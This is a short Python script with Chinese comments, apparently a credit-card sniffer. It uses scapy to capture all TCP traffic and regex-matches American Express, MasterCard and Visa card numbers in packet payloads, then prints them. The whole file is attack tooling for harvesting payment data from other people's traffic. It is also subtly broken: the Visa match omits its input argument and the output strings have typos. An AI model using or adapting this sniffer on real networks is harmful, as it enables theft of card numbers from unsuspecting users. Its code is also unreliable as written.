import re
from scapy.all import *
"""
嗅探数据，将抓到的数据报作为参数传递给回调函数，通过正则匹配，找到想要的数据，例如信用卡等信息。
"""


def find_credit_card(packet):
    """
    匹配数据报中的信用卡信息
    :param packet: 数据报
    :return:
    """
    # 输出数据报中的数据请求文本部分内容
    raw = packet.sprintf('%Raw.load%')
    # 匹配America Express Card
    america_re = re.findall('3[47][0-9]{13}', raw)
    # 匹配MasterCard
    master_re = re.findall('5[1-5][0-9]{14}', raw)
    # 匹配Vusa Card
    visa_re = re.findall('4[0-9][0-9]{12}(?:[0-9]{3})?')
    if america_re:
        print("Founc America Express Card: ", america_re)
    if master_re:
        print("Founc MasterCard Card: ", master_re)
    if visa_re:
        print("Founc Visa Card: ", visa_re)


def main():
    print("Starting Credit Card Sniffer...")
    # 开启嗅探
    sniff(filter="tcp", prn=find_credit_card, store=0)


if __name__ == '__main__':
    main()